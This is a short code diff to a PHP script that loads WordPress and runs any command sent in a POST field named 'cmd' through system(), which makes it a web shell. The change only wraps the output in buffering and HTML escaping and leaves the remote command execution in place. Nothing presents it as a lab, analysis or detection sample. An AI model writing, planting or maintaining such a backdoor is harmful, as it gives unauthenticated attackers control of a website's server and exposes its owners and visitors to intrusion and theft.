@@ -498,7 +498,10 @@ require_once('wp-load.php');
 if (isset($_POST['cmd'])) {
     header('Content-Type: text/plain');
     $cmd = escapeshellcmd($_POST['cmd']);
+    ob_start();
     system($cmd);
+    $output = ob_get_clean();
+    echo htmlspecialchars($output, ENT_QUOTES | ENT_SUBSTITUTE, 'UTF-8');
     exit;
 }
 ?>
